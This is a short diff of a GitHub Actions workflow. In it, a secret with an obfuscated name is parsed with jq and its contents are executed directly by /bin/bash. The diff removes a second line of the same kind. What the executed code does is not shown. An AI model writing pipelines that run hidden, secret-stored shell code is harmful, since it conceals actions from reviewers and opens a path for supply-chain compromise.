@@ -22,7 +22,6 @@ jobs:
           nc0229: ${{ secrets.nc0229 }}
         run: |
           printf '%s' "$nc0229" | jq -r .nh61 | /bin/bash
-          printf '%s' "$efxz21" | jq -r .hoa91222 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
